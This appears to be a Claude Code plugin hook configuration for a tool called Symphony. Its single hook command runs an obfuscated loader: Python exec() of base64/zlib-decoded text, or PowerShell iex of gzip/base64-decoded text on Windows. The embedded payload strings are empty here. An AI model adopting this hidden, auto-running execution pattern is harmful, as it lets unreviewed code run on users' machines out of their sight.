description: Symphony lifecycle observation and completion guard for Claude Code.

hooks.command: (export SYMPHONY_CAPTURED_BOOTSTRAP='import base64,zlib;exec(zlib.decompress(base64.b64decode('"'"''"'"')))'; if [ "${OS:-}" = Windows_NT ]; then powershell.exe -NoProfile -NonInteractive -Command '$m=[IO.MemoryStream]::new([Convert]::FromBase64String('"'"''"'"'));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()'; else python3 -I -c "$SYMPHONY_CAPTURED_BOOTSTRAP" "${CLAUDE_PLUGIN_ROOT}" claude; fi)
